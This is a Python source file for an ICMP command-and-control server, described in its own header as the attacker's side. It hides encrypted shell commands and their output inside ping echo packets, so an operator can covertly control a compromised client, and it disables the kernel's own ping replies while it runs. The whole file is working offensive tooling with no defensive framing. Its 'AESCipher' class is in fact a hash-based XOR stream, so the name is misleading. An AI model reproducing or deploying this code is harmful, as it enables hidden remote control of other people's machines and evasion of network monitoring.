#!/usr/bin/env python3
"""
ICMP C2 Server (Attaquant)
Usage: sudo python3 server.py --key mysecretpass
"""

import socket
import struct
import sys
import select
import argparse
import hashlib
import os
import threading
from datetime import datetime

# ===== Crypto =====

class AESCipher:
    def __init__(self, key: str):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, plaintext: bytes) -> bytes:
        iv = os.urandom(16)
        ct = self._xor_stream(plaintext, iv)
        return iv + ct

    def decrypt(self, data: bytes) -> bytes:
        iv = data[:16]
        ct = data[16:]
        return self._xor_stream(ct, iv)

    def _xor_stream(self, data: bytes, iv: bytes) -> bytes:
        out = bytearray()
        counter = 0
        while len(out) < len(data):
            block = hashlib.sha256(self.key + iv + struct.pack("<Q", counter)).digest()
            out.extend(block)
            counter += 1
        return bytes(a ^ b for a, b in zip(data, out[:len(data)]))

# ===== ICMP =====

MAGIC = b'\xDE\xAD'
MSG_POLL   = 0x01
MSG_OUTPUT = 0x02
MSG_CMD    = 0x03
MSG_NOP    = 0x04

ICMP_ECHO_REPLY   = 0
ICMP_ECHO_REQUEST = 8

def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def parse_icmp(packet: bytes):
    ip_header_len = (packet[0] & 0x0F) * 4
    src_ip = socket.inet_ntoa(packet[12:16])
    icmp_data = packet[ip_header_len:]
    if len(icmp_data) < 8:
        return None
    icmp_type, icmp_code, icmp_cksum, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_data[:8])
    payload = icmp_data[8:]
    return src_ip, icmp_type, icmp_id, icmp_seq, payload

def build_icmp_reply(icmp_id: int, icmp_seq: int, payload: bytes) -> bytes:
    # Construire sans checksum d'abord
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, icmp_id, icmp_seq)
    cksum = checksum(header + payload)
    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, cksum, icmp_id, icmp_seq)
    return header + payload

def make_payload(msg_type: int, data: bytes, cipher: AESCipher) -> bytes:
    encrypted = cipher.encrypt(data)
    return MAGIC + struct.pack("B", msg_type) + encrypted

def parse_payload(payload: bytes, cipher: AESCipher):
    if len(payload) < 4 or payload[:2] != MAGIC:
        return None
    msg_type = payload[2]
    encrypted = payload[3:]
    try:
        decrypted = cipher.decrypt(encrypted)
        return msg_type, decrypted
    except Exception:
        return None

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 Server")
    parser.add_argument("--key", "-k", required=True)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    cipher = AESCipher(args.key)

    if os.geteuid() != 0:
        print("[!] Root requis")
        sys.exit(1)

    # ====================================================
    # FIX 1 : Ne PAS activer IP_HDRINCL
    #          On envoie uniquement le paquet ICMP,
    #          le kernel ajoute l'en-tête IP tout seul.
    # ====================================================
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] Permission denied")
        sys.exit(1)

    # ====================================================
    # FIX 2 : Désactiver la réponse ICMP automatique du kernel
    #          pour éviter les doublons (réponse kernel + notre réponse)
    # ====================================================
    try:
        with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w") as f:
            f.write("1")
        print("[*] Kernel ICMP echo reply disabled")
    except Exception:
        print("[!] WARNING: Could not disable kernel ICMP replies")
        print("[!] Run: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all")

    print(f"""
╔══════════════════════════════════════════╗
║         ICMP C2 Server                   ║
║  Key : {args.key[:20]:<20s}              ║
║  Waiting for callback...                 ║
╚══════════════════════════════════════════╝
""")

    # ====================================================
    # FIX 3 : Thread séparé pour lire stdin
    #          select() sur stdin ne marche pas bien partout
    # ====================================================
    pending_command = [None]   # liste pour partage entre threads
    command_lock = threading.Lock()
    running = [True]

    def input_thread():
        while running[0]:
            try:
                line = input()
                if line.strip():
                    with command_lock:
                        pending_command[0] = line.strip()
                    if args.verbose:
                        print(f"[>] Queued: {line.strip()}")
            except EOFError:
                break
            except Exception:
                break

    t = threading.Thread(target=input_thread, daemon=True)
    t.start()

    client_ip = None

    try:
        while True:
            # ====================================================
            # FIX 4 : select uniquement sur le socket
            # ====================================================
            readable, _, _ = select.select([sock], [], [], 0.1)

            if sock not in readable:
                continue

            try:
                raw, addr = sock.recvfrom(65535)
            except Exception:
                continue

            parsed = parse_icmp(raw)
            if not parsed:
                continue

            src_ip, icmp_type, icmp_id, icmp_seq, payload = parsed

            if icmp_type != ICMP_ECHO_REQUEST:
                continue

            result = parse_payload(payload, cipher)
            if not result:
                if args.verbose:
                    print(f"[?] Non-C2 ICMP from {src_ip}, ignoring")
                continue

            msg_type, data = result

            if msg_type == MSG_POLL:
                if client_ip is None or client_ip != src_ip:
                    client_ip = src_ip
                    ts = datetime.now().strftime("%H:%M:%S")
                    print(f"[{ts}] ✓ Client connected: {src_ip}")
                    print(f"[*] Type commands below:\n")

                with command_lock:
                    cmd = pending_command[0]
                    pending_command[0] = None

                if cmd:
                    if cmd.lower() == "exit":
                        reply_payload = make_payload(MSG_CMD, b"exit", cipher)
                        reply = build_icmp_reply(icmp_id, icmp_seq, reply_payload)
                        sock.sendto(reply, (src_ip, 0))
                        print("[*] Exit sent.")
                        break

                    if args.verbose:
                        print(f"[>] Sending cmd: {cmd}")
                    reply_payload = make_payload(MSG_CMD, cmd.encode(), cipher)
                else:
                    reply_payload = make_payload(MSG_NOP, b"", cipher)

                reply = build_icmp_reply(icmp_id, icmp_seq, reply_payload)
                sock.sendto(reply, (src_ip, 0))

            elif msg_type == MSG_OUTPUT:
                output = data.decode(errors="replace")
                sys.stdout.write(output)
                sys.stdout.flush()

                # ACK
                reply_payload = make_payload(MSG_NOP, b"", cipher)
                reply = build_icmp_reply(icmp_id, icmp_seq, reply_payload)
                sock.sendto(reply, (src_ip, 0))

    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        running[0] = False
        # ====================================================
        # FIX 5 : Restaurer le comportement ICMP du kernel
        # ====================================================
        try:
            with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w") as f:
                f.write("0")
            print("[*] Kernel ICMP echo reply restored")
        except Exception:
            pass
        sock.close()

if __name__ == "__main__":
    main()
